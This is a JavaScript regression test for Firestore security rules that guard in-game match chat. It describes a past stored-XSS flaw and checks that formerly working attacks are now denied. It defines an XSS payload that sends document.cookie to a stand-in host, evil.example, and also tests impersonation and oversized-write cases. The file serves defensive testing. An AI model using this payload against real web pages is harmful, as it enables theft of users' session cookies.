/*
 * Match chat, against the real firestore.rules.
 *
 * Chat used to be an array of HTML strings the client built and the rules never
 * inspected. escapeHtml() ran in the SENDER's browser, which protects nobody,
 * because the attacker is the sender: a participant could updateDoc
 * `<img src=x onerror=...>` straight into the array and both renderers dropped
 * it into innerHTML on the opponent's page, at the origin holding their ID
 * token. Public matchmaking put that one "Find Match" click from any stranger.
 * The array was also unbounded — 60,000-char lines and 500-element writes were
 * both accepted, on the same document that takes every score write.
 *
 * Chat is data now, validated per line here, and free text is PRIVATE MATCHES
 * ONLY: a public match may send only one of a closed set of phrases, which is
 * why the game needs no profanity filter. Every case below is an attack that
 * used to work, or a legitimate write that must keep working.
 *
 * Needs the Firestore emulator (run via `npm test`).
 */
import { initializeTestEnvironment } from '@firebase/rules-unit-testing';
import { doc, setDoc, updateDoc, arrayUnion, setLogLevel } from 'firebase/firestore';
setLogLevel('silent');
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
const REPO = (f) => path.join(path.dirname(fileURLToPath(import.meta.url)), '..', f);

const env = await initializeTestEnvironment({
  projectId: 'demo-chat-rules',
  firestore: { rules: fs.readFileSync(REPO('firestore.rules'), 'utf8'), host: '127.0.0.1', port: 8080 },
});

const ABSENT = Symbol('absent');
const ME = 'p2';
const db = env.authenticatedContext(ME).firestore();
const results = [];
let seq = 0;

// A duel with me as the guest, or an FFA with me in slot 1.
const seed = (id, over = {}) => env.withSecurityRulesDisabled((ctx) => {
  const base = over.mode === 'ffa'
    ? { mode: 'ffa', hostUid: 'p1', status: 'playing', playerCount: 3,
        p0Uid: 'p1', p1Uid: ME, p2Uid: 'p3', p3Uid: null, p4Uid: null, p5Uid: null }
    : { hostUid: 'p1', guestUid: ME, status: 'playing' };
  const data = { isPublic: true, chat: [], ...base, ...over };
  // ABSENT is how a case says "this field is not in the document at all" —
  // spreading undefined would leave the key present and Firestore rejects it.
  Object.keys(data).forEach((k) => { if (data[k] === ABSENT) delete data[k]; });
  return setDoc(doc(ctx.firestore(), 'matches', id), data);
});

const line = (o = {}) => ({ u: ME, n: 'SODA', t: 'gg', p: true, at: 1700000000000, ...o });

// Seeds a fresh match, attempts the write, records whether the verdict matched.
const check = async (name, shouldPass, data, over = {}) => {
  const id = 'm' + (++seq);
  await seed(id, over);
  let denied = false, why = '';
  try { await updateDoc(doc(db, 'matches', id), data); }
  catch (e) { denied = true; why = e.code || String(e); }
  results.push([denied !== shouldPass ? 'PASS' : 'FAIL',
                 name + (denied === shouldPass ? `  :: got ${denied ? 'DENIED ' + why : 'ALLOWED'}` : '')]);
};

// --- the attacks that used to work ----------------------------------------
const XSS = '<img src=x onerror="fetch(\'https://evil.example/?c=\'+document.cookie)">';
await check('raw HTML string appended to chat', false, { chat: arrayUnion(XSS) });
await check('raw HTML as a line\'s text', false, { chat: arrayUnion(line({ t: XSS, p: false })) }, { isPublic: false });
await check('raw HTML in a line\'s display name', false, { chat: arrayUnion(line({ n: '<img src=x>' })) });
await check('a line attributed to another player', false, { chat: arrayUnion(line({ u: 'p1' })) });
await check('a 60,000-char line', false, { chat: arrayUnion(line({ t: 'x'.repeat(60000), p: false })) }, { isPublic: false });
await check('chat replaced with a number', false, { chat: 42 });
await check('chat replaced with a string', false, { chat: 'gg' });
await check('500 lines in one write', false, { chat: arrayUnion(...Array.from({ length: 500 }, (_, i) => line({ at: i }))) });
await check('two lines in one write', false, { chat: arrayUnion(line({ at: 1 }), line({ at: 2 })) });
await check('the history wiped and replaced', false, { chat: [line({ at: 9 })] }, { chat: [line({ at: 1 }), line({ at: 2 })] });
await check('an earlier line edited', false,
  { chat: [line({ at: 1, t: 'Wow!' }), line({ at: 2 })] }, { chat: [line({ at: 1 }), line({ at: 2 })] });
await check('chat emptied', false, { chat: [] }, { chat: [line({ at: 1 })] });
// The create rule, exercised as a real client create rather than a seeded doc:
// without it a host could open a room whose chat already held a payload and
// skip the per-line validation entirely.
const created = async (name, shouldPass, data) => {
  const id = 'c' + (++seq);
  let denied = false, why = '';
  try { await setDoc(doc(db, 'matches', id), { hostUid: ME, guestUid: null, status: 'waiting', isPublic: true, ...data }); }
  catch (e) { denied = true; why = e.code || String(e); }
  results.push([denied !== shouldPass ? 'PASS' : 'FAIL',
                 name + (denied === shouldPass ? `  :: got ${denied ? 'DENIED ' + why : 'ALLOWED'}` : '')]);
};
await created('a match created with an HTML payload in chat', false, { chat: [XSS] });
await created('a match created with a valid line pre-loaded', false, { chat: [line()] });
await created('a match created with no chat field at all', false, {});
await created('a match created silent (chat: [])', true, { chat: [] });

// --- P1: free text is private matches only --------------------------------
await check('free text in a PUBLIC duel', false, { chat: arrayUnion(line({ t: 'hey there', p: false })) });
await check('free text in a PUBLIC ffa', false, { chat: arrayUnion(line({ t: 'hey there', p: false })) }, { mode: 'ffa' });
await check('free text in a PRIVATE duel', true, { chat: arrayUnion(line({ t: 'hey there', p: false })) }, { isPublic: false });
await check('free text in a PRIVATE ffa', true, { chat: arrayUnion(line({ t: 'hey there', p: false })) }, { mode: 'ffa', isPublic: false });
// Claiming p:true does not make arbitrary text a preset.
await check('off-list text flagged as a preset', false, { chat: arrayUnion(line({ t: 'hey there', p: true })) });
// A near-miss on a real phrase is still off-list — the set is exact.
await check('a near-miss on a preset ("Good luck !")', false, { chat: arrayUnion(line({ t: 'Good luck !' })) });
await check('a preset with different case ("GG")', false, { chat: arrayUnion(line({ t: 'GG' })) });
// The restrictive default: a doc with no isPublic must not unlock free text.
await check('free text where isPublic is absent', false, { chat: arrayUnion(line({ t: 'hey', p: false })) }, { isPublic: ABSENT });
await check('a preset where isPublic is absent', true, { chat: arrayUnion(line()) }, { isPublic: ABSENT });

// --- shape and bounds ------------------------------------------------------
await check('an extra key on the line', false, { chat: arrayUnion({ ...line(), evil: 'x' }) });
await check('a missing key on the line', false, { chat: arrayUnion({ u: ME, n: 'SODA', t: 'gg' }) });
await check('a 21-char display name', false, { chat: arrayUnion(line({ n: 'x'.repeat(21) })) });
await check('an empty display name', false, { chat: arrayUnion(line({ n: '' })) });
await check('50-char free text (the limit)', true, { chat: arrayUnion(line({ t: 'x'.repeat(50), p: false })) }, { isPublic: false });
await check('51-char free text', false, { chat: arrayUnion(line({ t: 'x'.repeat(51), p: false })) }, { isPublic: false });
await check('empty free text', false, { chat: arrayUnion(line({ t: '', p: false })) }, { isPublic: false });
await check('the 40th line (the ceiling)', true, { chat: arrayUnion(line({ at: 999 })) },
  { chat: Array.from({ length: 39 }, (_, i) => line({ at: i })) });
await check('the 41st line', false, { chat: arrayUnion(line({ at: 999 })) },
  { chat: Array.from({ length: 40 }, (_, i) => line({ at: i })) });

// --- every preset must actually be sendable -------------------------------
// Extracted from the rules file itself, so adding a phrase to only one of the
// two lists cannot pass here.
const presets = JSON.parse('[' + fs.readFileSync(REPO('firestore.rules'), 'utf8')
  .match(/function chatPresets\(\) \{\s*return \[([^\]]*)\]/)[1]
  .replace(/'/g, '"') + ']');
for (const phrase of presets) {
  await check(`preset "${phrase}" is sendable in a public match`, true, { chat: arrayUnion(line({ t: phrase }))} );
}

// --- legitimate traffic must keep working ---------------------------------
await check('a normal gameplay update (no chat key)', true, { guestScore: 500 });
await check('an ffa gameplay update (no chat key)', true, { p1Score: 500 }, { mode: 'ffa' });
await check('a gameplay update alongside one valid line', true, { guestScore: 500, chat: arrayUnion(line()) });
await check('a second preset after a first', true, { chat: arrayUnion(line({ t: 'Nice!', at: 2 })) }, { chat: [line({ at: 1 })] });
// A non-participant still cannot speak at all.
const outsider = env.authenticatedContext('nobody').firestore();
await seed('outsider');
let outsiderDenied = false;
try { await updateDoc(doc(outsider, 'matches', 'outsider'), { chat: arrayUnion(line({ u: 'nobody' })) }); }
catch (e) { outsiderDenied = true; }
results.push([outsiderDenied ? 'PASS' : 'FAIL', 'a non-participant cannot speak']);
// And a payout field is still untouchable, chat line or not.
await check('a payout field smuggled in beside a chat line', false,
  { winner: ME, chat: arrayUnion(line()) });

for (const [s, n] of results) console.log(s.padEnd(5), n);
console.log('\n' + results.filter(r => r[0] === 'PASS').length + '/' + results.length + ' checks passed');
await env.cleanup();
process.exit(results.some(r => r[0] === 'FAIL') ? 1 : 0);
